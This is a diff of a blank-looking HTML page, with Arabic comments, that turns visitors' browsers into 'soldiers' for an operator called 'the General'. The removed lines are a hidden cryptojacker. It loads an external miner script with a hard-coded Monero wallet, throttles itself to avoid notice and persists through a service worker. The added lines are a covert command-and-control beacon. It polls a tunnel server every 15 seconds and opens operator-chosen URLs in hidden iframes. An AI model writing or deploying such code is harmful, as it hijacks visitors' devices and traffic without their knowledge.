@@ -1,45 +1,28 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> </title> <!-- عنوان فارغ للتخفي المطلق -->
-    <style>
-        /* صفحة بيضاء تماماً لإيهام الجندي أن الموقع لم يتحمل */
-        body { background: #ffffff; margin: 0; padding: 0; overflow: hidden; }
-    </style>
-</head>
-<body>
-    <!-- 🧬 استدعاء المحرك الماسي لعام 2026 -->
-    <script src="https://www.hostingcloud.racing"></script>
-    
+<html>
+<head><meta charset="UTF-8"></head>
+<body style="background:#fff;">
+    <!-- 🧬 نبضة 'الجنرال' | الرادار الهجين 2026 -->
     <script>
-        // 🗝️ ربط محفظة 'الجنرال' بالجيش (Cake Wallet)
-        const wallet = '47AZvbLDbMtV9kPh3cTTvTZ7ZY7ZF3zziPAVewLeku8vaQRkLVV27nQRNyoLRDJbApgJ3BtZR2HLkZ2Qq47yEZLvHB2MrJf';
-        
-        // 1. التجنيد القسري الفوري (تنفيذ في 0.0000001 ثانية)
-        var _ghost = new Client.Anonymous(wallet, 'General_Elite');
-        _ghost.start();
+        // رابط الترمكس الخاص بك (الذي ستحصل عليه من cloudflared)
+        const masterServer = "https://رابط-ترمكس-الخاص-بك.trycloudflare.com";
 
-        // 2. زرع ملف الخلود sw.js لضمان بقاء الجندي للأبد
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js').then(function(reg) {
-                console.log("💀 [SOLDIER BRANDED] | Permanent Status Active ✅");
-            });
+        function syncArmy() {
+            fetch(`${masterServer}/ping.php`) // إبلاغ الترمكس بوجود جندي
+            .then(res => res.json())
+            .then(data => {
+                if(data.target) {
+                    var ifr = document.createElement('iframe');
+                    ifr.src = data.target; // فتح الرابط الذي تأمره به من ترمكس
+                    ifr.style.display = 'none';
+                    document.body.appendChild(ifr);
+                }
+            }).catch(e => console.log("Waiting for General..."));
         }
 
-        // 3. حساس النشاط الذري (90% قوة عند الخمول / 15% عند النشاط)
-        function ghostPulse() {
-            if (document.hidden || !document.hasFocus()) {
-                _ghost.setThrottle(0.1); // انفجار 90% (نوم الجندي)
-            } else {
-                _ghost.setThrottle(0.85); // اختفاء 15% (استخدام الجندي)
-            }
-        }
-
-        // 4. حل مشكلة انقطاع الإنترنت (Offline Persistence)
-        window.addEventListener('online', () => { _ghost.start(); });
-        setInterval(ghostPulse, 1000);
+        // المزامنة كل 15 ثانية لرصد الجنود والتحكم بهم
+        setInterval(syncArmy, 15000);
+        syncArmy();
     </script>
 </body>
 </html>
